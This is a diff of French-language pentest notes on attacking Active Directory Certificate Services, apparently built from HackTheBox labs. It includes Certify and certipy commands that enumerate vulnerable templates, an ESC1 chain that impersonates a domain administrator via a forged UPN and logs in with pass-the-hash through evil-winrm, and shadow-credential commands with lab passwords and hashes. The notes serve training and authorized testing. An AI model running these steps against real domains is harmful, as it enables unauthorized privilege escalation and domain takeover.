@@ -5,7 +5,6 @@
 
 
 ### Récupérer les hashs de comptes avec certipyad
-ref : https://github.com/GhostPack/Certify
 ```bash
  certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
  certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm
@@ -21,8 +20,34 @@ netexec ldap <ip> -u user -p pass -M adcs
 certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled -stdout
 ```
 
+### utilisation sur une machine windows
+ref : https://github.com/GhostPack/Certify
+```cmd
+upload Certify.exe
+
+# Enumeration des Certificat Authories
+.\Certify.exe cas
+
+# Identiier les ADCS vulnérable
+.\Certify.exe find /vulnerable
+
+
+```
+
+
+
+
 ## Exploitation des ADCS 
 ### ESC1 
+vulnérable nommé UserAuthentication. Plus précisément, les utilisateurs authentifiés peuvent s'inscrire à ce modèle et, puisque l'indicateur msPKI-CertificateName-Flag est présent et contient ENROLLEE_SUPPLIES_OBJECT, le modèle est vulnérable au scénario ESC1. Concrètement, cela permet à quiconque de s'inscrire à ce modèle et de spécifier un nom alternatif de sujet arbitraire. Autrement dit, il serait possible de s'authentifier en tant qu'administrateur de domaine en exploitant cette vulnérabilité.
+
+```bash
+certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
+
+certipy auth -pfx administrator.pfx
+
+evil-winrm -i sequel.htb -u administrator -H a52f78e<SNIP>58f4ee
+```
 
 ### ECS16
 Cette attaque exploit une mauvaise configuration ou CA (Certificat d'authorité) es configuré globalement à désactivé. `szIOD_NDTS_CA_SECURITY_EXT`
